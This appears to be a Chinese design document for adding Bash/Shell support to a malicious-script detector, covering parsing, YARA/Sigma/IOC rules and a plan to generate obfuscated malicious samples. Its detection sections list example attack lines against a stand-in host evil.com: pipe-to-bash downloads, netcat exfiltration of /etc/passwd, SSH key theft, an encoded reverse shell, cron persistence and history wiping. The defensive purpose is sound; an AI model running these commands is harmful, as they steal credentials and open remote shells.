# Round 21: Bash/Shell 支持 - 设计文档

**状态**: 🔄 进行中  
**启动时间**: 2026-03-24 20:20  
**预计完成**: 1 小时

---

## 🎯 目标

支持 Bash/Shell 脚本的安全检测，覆盖系统管理、自动化运维场景。

---

## 📋 核心需求

### 功能需求

| 需求 | 说明 | 优先级 |
|------|------|--------|
| **Shell 词法分析** | 命令/参数/管道识别 | 🔴 高 |
| **Shell 语法分析** | 简化 AST (命令树) | 🔴 高 |
| **Shell 行为分析** | 语义级别行为识别 | 🔴 高 |
| **Shell 规则匹配** | YARA/Sigma/IOC 规则 | 🔴 高 |
| **Shell 样本生成** | 50+ 恶意样本 (多变体) | 🔴 高 |

### 质量要求

- **样本数量**: 60+ 恶意 + 20+ 安全 (变体丰富)
- **检测率**: ≥98%
- **误报率**: <2%
- **变体覆盖**: 每类攻击 5-10 个变体

---

## 🏗️ 技术架构

### Shell 分析器架构

```
Shell 脚本
    ↓
词法分析 (命令/参数/变量/管道)
    ↓
命令树构建 (简化 AST)
    ↓
行为特征提取
    ↓
风险评分
    ↓
检测结果
```

### Shell 特有挑战

| 挑战 | 说明 | 解决方案 |
|------|------|----------|
| **变量展开** | `$VAR`, `${VAR}` | 符号追踪 |
| **命令替换** | `$(cmd)`, `` `cmd` `` | 嵌套分析 |
| **管道** | `cmd1 | cmd2` | 数据流追踪 |
| **重定向** | `>`, `>>`, `<` | 文件访问分析 |
| **引号** | `'`, `"`, `\` | 字符串解析 |

---

## 🔍 检测能力设计

### 1. 危险命令检测

```bash
# 代码执行
eval $code
exec $command
$(...)  # 命令替换中的危险命令

# 远程下载
curl http://evil.com/script.sh | bash
wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd

# 数据外传
cat /etc/passwd | nc evil.com 4444
tar czf - /home | ssh user@evil.com 'cat > /tmp/data.tar.gz'

# 持久化
echo "backdoor" >> ~/.bashrc
echo "cron job" | crontab -

# 凭证窃取
cat ~/.ssh/id_rsa | base64 | curl -X POST http://evil.com/keys
history | mail attacker@evil.com
```

### 2. 混淆检测

```bash
# Base64 编码
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS80NDQ0IDA+JjE= | base64 -d | bash

# 十六进制编码
printf '\x62\x61\x73\x68' | bash  # "bash"

# 变量混淆
a=cat; b=/etc/passwd; $a $b

# 字符拼接
c="ca"; h="t"; $c$h /etc/passwd
```

### 3. 恶意行为模式

```bash
# 1. 远程代码执行
curl -s http://evil.com/script.sh | bash
wget -qO- http://evil.com/backdoor.sh | sh

# 2. 数据外传
find /home -name "*.ssh" -exec cat {} \; | nc evil.com 4444

# 3. 持久化
echo "* * * * * /tmp/backdoor.sh" | crontab -

# 4. 提权尝试
sudo -l
find / -perm -4000 -type f 2>/dev/null

# 5. 反侦察
history -c
unset HISTFILE
rm -f ~/.bash_history
```

---

## 📊 攻击类型映射 (MITRE ATLAS)

| 攻击类型 | Shell 示例 | 检测特征 |
|----------|-----------|----------|
| **远程执行** | `curl ... \| bash` | curl/wget + pipe + bash |
| **命令注入** | `eval $input` | eval/exec + 变量 |
| **文件读取** | `cat /etc/passwd` | cat + 敏感路径 |
| **文件写入** | `echo > ~/.bashrc` | echo + 重定向 + 系统文件 |
| **数据外传** | `... \| nc evil.com` | pipe + nc/curl + 外网 |
| **持久化** | `crontab -` | crontab + 写入 |
| **凭证窃取** | `cat ~/.ssh/*` | cat + SSH 路径 |
| **混淆执行** | `base64 -d \| bash` | base64 + 解码 + 执行 |
| **提权侦察** | `find ... -perm -4000` | find + SUID |
| **反侦察** | `history -c` | history + 清除 |

---

## 📁 文件结构

```
round21/
├── ROUND21_DESIGN.md           # 设计文档 (本文件)
├── shell_analyzer.py           # Shell 分析器核心
├── shell_tokenizer.py          # Shell 词法分析
├── shell_sample_generator.py   # 样本生成器 (重点)
├── shell_rules_generator.py    # 规则生成器
├── test_shell_samples.py       # 测试脚本
└── reports/
    └── ROUND21_REPORT.md       # 完成报告

samples/
└── shell_malicious/            # 60+ Shell 恶意样本
    ├── remote_exec_001.sh
    ├── command_injection_001.sh
    ├── data_exfil_001.sh
    └── ...

rules/
├── shell_yara_rules.yaml       # Shell YARA 规则
├── shell_sigma_rules.yaml      # Shell Sigma 规则
└── shell_ioc_rules.json        # Shell IOC 指标
```

---

## 🚀 实施步骤

### Step 1: 实现 Shell 分析器 (20 分钟)
- 词法分析 (命令/参数/管道)
- 危险命令识别
- 行为模式匹配
- 风险评分

### Step 2: 生成高质量样本 (30 分钟)
- **60+ 恶意样本** (10 类 × 6 变体)
- **20+ 安全样本** (系统管理脚本)
- **变体丰富**: 不同语法、不同混淆、不同场景

### Step 3: 生成检测规则 (10 分钟)
- YARA 规则 (15+ 条)
- Sigma 规则 (2+ 条)
- IOC 指标 (20+ 条)

### Step 4: 测试验证 (10 分钟)
- 批量测试所有样本
- 验证检测率/误报率
- 生成测试报告

---

## 📊 验收标准

### 样本质量

- [ ] 恶意样本 60+ (10 类攻击 × 6 变体)
- [ ] 安全样本 20+ (真实系统管理脚本)
- [ ] 变体多样性 (不同语法/混淆/场景)
- [ ] 每个样本有明确攻击意图

### 检测质量

- [ ] 检测率 ≥98%
- [ ] 误报率 <2%
- [ ] 能识别常见混淆
- [ ] 能识别管道/重定向组合攻击

### 性能

- [ ] 单文件扫描 <5ms
- [ ] 批量扫描 (100 文件) <2s

---

## 🎯 样本生成策略

### 恶意样本变体设计

每类攻击生成 **6 个变体**:

| 变体 | 特点 | 示例 |
|------|------|------|
| **V1** | 直接执行 | `curl http://evil.com/x.sh \| bash` |
| **V2** | 变量替换 | `URL=...; curl $URL \| bash` |
| **V3** | Base64 编码 | `echo BASE64 \| base64 -d \| bash` |
| **V4** | 字符拼接 | `c=ca; t=t; $c$t /etc/passwd` |
| **V5** | 命令替换 | `bash -c "$(curl http://evil.com/x.sh)"` |
| **V6** | 混合混淆 | 组合多种技巧 |

### 安全样本设计

真实系统管理场景:

- 系统信息收集
- 日志轮转
- 备份脚本
- 服务监控
- 批量操作
- 环境初始化

---

**准备启动 Round 21！** 🚀
